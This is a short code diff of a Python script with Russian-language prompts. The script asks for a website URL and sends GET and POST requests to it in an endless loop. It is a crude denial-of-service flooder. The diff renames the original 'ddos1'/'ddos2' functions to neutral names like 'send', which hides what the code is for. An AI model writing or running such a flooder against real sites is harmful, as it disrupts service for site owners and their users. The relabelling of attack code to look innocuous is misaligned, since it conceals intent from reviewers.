@@ -1,19 +1,19 @@
 import requests
 
-ddos1 = requests.get
-ddos2 = requests.post
+send2 = requests.get
+send = requests.post
 
-URL = input("Адрес сайта: ")
+URL = input("Ссылка: ")
 
 while True:
            try:
-               ddos1(URL)
+               send(URL)
                print("Запрос отравлен!")
            except requests.exceptions.ConnectionError:
                                                       print("Ошибка отправки!")
 
            try:
-               ddos2(URL)
+               send2(URL)
                print("Запрос отравлен!")
            except requests.exceptions.ConnectionError:
                                                       print("Ошибка отправки!")
